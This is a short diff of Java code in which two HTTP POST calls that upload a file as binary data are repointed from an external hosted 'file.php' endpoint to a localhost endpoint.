@@ -104,7 +104,7 @@
 						FileEntity reqEntity = new FileEntity(target, "binary/octet-stream");
 						
 						//launch http request
-						HttpPost post = new HttpPost("http://500iqproject.atwebpages.com/file.php");
+						HttpPost post = new HttpPost("http://localhost/file.php");
 						
 						//set binary entity
 						post.setEntity(reqEntity);
@@ -123,7 +123,7 @@
 					{
 						File target2 = new File(finalres2);
 						FileEntity reqEntity2 = new FileEntity(target2, "binary/octet-stream");
-						HttpPost post2 = new HttpPost("http://500iqproject.atwebpages.com/file.php");
+						HttpPost post2 = new HttpPost("http://localhost/file.php");
 
 						post2.setEntity(reqEntity2);
 						reqEntity2.setContentType("binary/octet-stream");
